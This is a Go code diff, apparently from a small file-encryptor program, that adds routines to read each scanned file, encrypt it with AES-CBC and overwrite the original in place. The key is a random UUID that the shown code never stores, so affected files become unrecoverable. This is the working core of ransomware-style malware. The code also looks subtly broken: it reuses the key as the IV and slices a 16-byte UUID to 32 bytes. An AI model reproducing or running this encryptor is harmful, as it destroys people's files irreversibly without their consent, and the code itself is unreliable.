@@ -5,11 +5,15 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"fmt"
+	uuid "github.com/satori/go.uuid"
+	"io/ioutil"
 )
+
+var encryptKey = generateKey()
 
 func Encrypt(fileChannel *chan PathedFile, scanCompleteChannel *chan bool) {
 	if len(*fileChannel) == 0 {
-		fmt.Println("no file found to encrypt.exit.")
+		fmt.Println("no file found to encryptAesCBC.exit.")
 		return
 	}
 	for true {
@@ -25,13 +29,21 @@ func Encrypt(fileChannel *chan PathedFile, scanCompleteChannel *chan bool) {
 		}
 	}
 end:
-	fmt.Println("encrypt complete,total: ", fileCount)
+	fmt.Println("encryptAesCBC complete,total: ", fileCount)
 }
 
 func doEncrypt(file PathedFile) {
 	fileCount++
+	plainBytes, err := ioutil.ReadFile(file.path)
+	if err != nil {
+		panic(err)
+	}
+	encryptedBytes := encryptAesCBC(plainBytes, []byte(encryptKey))
+	err = ioutil.WriteFile(file.path, encryptedBytes, file.info.Mode())
+	if err != nil {
+		panic("encryptAesCBC file[ " + file.path + " ] error")
+	}
 	fmt.Println(file.info.Name(), " encrypted")
-
 }
 
 func paddingText(str []byte, blockSize int) []byte {
@@ -41,7 +53,7 @@ func paddingText(str []byte, blockSize int) []byte {
 	return newPaddingStr
 }
 
-func encrypt(src, key []byte) []byte {
+func encryptAesCBC(src, key []byte) []byte {
 	block, err := aes.NewCipher(key)
 	if err != nil {
 		fmt.Println(nil)
@@ -51,4 +63,9 @@ func encrypt(src, key []byte) []byte {
 	blockMode := cipher.NewCBCEncrypter(block, key)
 	blockMode.CryptBlocks(src, src)
 	return src
+}
+
+func generateKey() string {
+	key := uuid.Must(uuid.NewV4())
+	return string(key[:aes.BlockSize*2])
 }
